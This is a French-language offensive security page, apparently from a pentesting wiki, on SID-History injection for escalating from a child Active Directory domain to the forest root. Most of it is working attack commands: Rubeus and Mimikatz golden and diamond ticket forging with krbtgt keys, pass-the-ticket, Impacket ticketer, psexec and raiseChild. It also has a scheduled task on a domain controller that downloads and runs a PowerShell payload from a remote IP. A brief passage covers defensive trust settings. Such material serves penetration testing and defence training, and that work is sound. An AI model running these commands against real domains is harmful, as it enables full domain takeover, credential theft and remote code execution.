# SID-History Injection

{{#include ../../banners/hacktricks-training.md}}

## Attaque par Injection de SID History

L'objectif de l'**Attaque par Injection de SID History** est d'aider à la **migration des utilisateurs entre les domaines** tout en garantissant un accès continu aux ressources de l'ancien domaine. Cela est accompli en **incorporant l'Identifiant de Sécurité (SID) précédent de l'utilisateur dans l'historique SID** de son nouveau compte. Notamment, ce processus peut être manipulé pour accorder un accès non autorisé en ajoutant le SID d'un groupe à privilèges élevés (tel que les Administrateurs d'Entreprise ou les Administrateurs de Domaine) du domaine parent à l'historique SID. Cette exploitation confère l'accès à toutes les ressources au sein du domaine parent.

Deux méthodes existent pour exécuter cette attaque : par la création d'un **Golden Ticket** ou d'un **Diamond Ticket**.

Pour identifier le SID du groupe **"Administrateurs d'Entreprise"**, il faut d'abord localiser le SID du domaine racine. Après identification, le SID du groupe Administrateurs d'Entreprise peut être construit en ajoutant `-519` au SID du domaine racine. Par exemple, si le SID du domaine racine est `S-1-5-21-280534878-1496970234-700767426`, le SID résultant pour le groupe "Administrateurs d'Entreprise" serait `S-1-5-21-280534878-1496970234-700767426-519`.

Vous pourriez également utiliser les groupes **Administrateurs de Domaine**, qui se terminent par **512**.

Une autre façon de trouver le SID d'un groupe de l'autre domaine (par exemple "Administrateurs de Domaine") est avec :
```bash
Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
```
> [!WARNING]
> Notez qu'il est possible de désactiver l'historique SID dans une relation de confiance, ce qui fera échouer cette attaque.

Selon les [**docs**](https://technet.microsoft.com/library/cc835085.aspx) :
- **Désactivation de l'historique SID sur les forêts de confiance** en utilisant l'outil netdom (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
- **Application de la mise en quarantaine du filtre SID aux relations de confiance externes** en utilisant l'outil netdom (`netdom trust /domain: /quarantine:yes on the domain controller`)
- **Application du filtrage SID aux relations de confiance de domaine au sein d'une seule forêt** n'est pas recommandé car c'est une configuration non prise en charge et peut entraîner des changements disruptifs. Si un domaine au sein d'une forêt est peu fiable, il ne devrait pas être membre de la forêt. Dans cette situation, il est nécessaire de d'abord séparer les domaines de confiance et non fiables en forêts distinctes où le filtrage SID peut être appliqué à une relation de confiance inter-forêts.

Consultez ce post pour plus d'informations sur le contournement de cela : [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)

### Diamond Ticket (Rubeus + KRBTGT-AES256)

La dernière fois que j'ai essayé cela, j'ai dû ajouter l'arg **`/ldap`**.
```bash
# Use the /sids param
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap /ldap

# Or a ptt with a golden ticket
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

#e.g.

execute-assembly ../SharpCollection/Rubeus.exe golden /user:Administrator /domain:current.domain.local /sid:S-1-21-19375142345-528315377-138571287 /rc4:12861032628c1c32c012836520fc7123 /sids:S-1-5-21-2318540928-39816350-2043127614-519 /ptt /ldap /nowrap /printcmd

# You can use "Administrator" as username or any other string
```
### Golden Ticket (Mimikatz) avec KRBTGT-AES256
```bash
mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"

/user is the username to impersonate (could be anything)
/domain is the current domain.
/sid is the current domain SID.
/sids is the SID of the target group to add ourselves to.
/aes256 is the AES256 key of the current domain's krbtgt account.
--> You could also use /krbtgt:<HTML of krbtgt> instead of the "/aes256" option
/startoffset sets the start time of the ticket to 10 mins before the current time.
/endin sets the expiry date for the ticket to 60 mins.
/renewmax sets how long the ticket can be valid for if renewed.

# The previous command will generate a file called ticket.kirbi
# Just loading you can perform a dcsync attack agains the domain
```
Pour plus d'informations sur les golden tickets, consultez :

{{#ref}}
golden-ticket.md
{{#endref}}


Pour plus d'informations sur les diamond tickets, consultez :

{{#ref}}
diamond-ticket.md
{{#endref}}
```bash
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
.\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
ls \\mcorp-dc.moneycorp.local\c$
```
Élever au DA de root ou à l'administrateur d'entreprise en utilisant le hash KRBTGT du domaine compromis :
```bash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'

Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'

gwmi -class win32_operatingsystem -ComputerName mcorpdc.moneycorp.local

schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "STCheck114" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"

schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
```
Avec les autorisations acquises grâce à l'attaque, vous pouvez exécuter par exemple une attaque DCSync dans le nouveau domaine :

{{#ref}}
dcsync.md
{{#endref}}

### Depuis linux

#### Manuel avec [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)
```bash
# This is for an attack from child to root domain
# Get child domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep "Domain SID"
# Get root domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep -B20 "Enterprise Admins" | grep "Domain SID"

# Generate golden ticket
ticketer.py -nthash <krbtgt_hash> -domain <child_domain> -domain-sid <child_domain_sid> -extra-sid <root_domain_sid> Administrator

# NOTE THAT THE USERNAME ADMINISTRATOR COULD BE ACTUALLY ANYTHING
# JUST USE THE SAME USERNAME IN THE NEXT STEPS

# Load ticket
export KRB5CCNAME=hacker.ccache

# psexec in domain controller of root
psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
```
#### Automatique en utilisant [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)

Ceci est un script Impacket qui **automatisera l'escalade du domaine enfant au domaine parent**. Le script nécessite :

- Contrôleur de domaine cible
- Identifiants pour un utilisateur admin dans le domaine enfant

Le flux est :

- Obtient le SID pour le groupe des Administrateurs d'Entreprise du domaine parent
- Récupère le hash pour le compte KRBTGT dans le domaine enfant
- Crée un Golden Ticket
- Se connecte au domaine parent
- Récupère les identifiants pour le compte Administrateur dans le domaine parent
- Si le commutateur `target-exec` est spécifié, il s'authentifie auprès du Contrôleur de Domaine du domaine parent via Psexec.
```bash
raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
```
## Références

- [https://adsecurity.org/?p=1772](https://adsecurity.org/?p=1772)
- [https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)

{{#include ../../banners/hacktricks-training.md}}
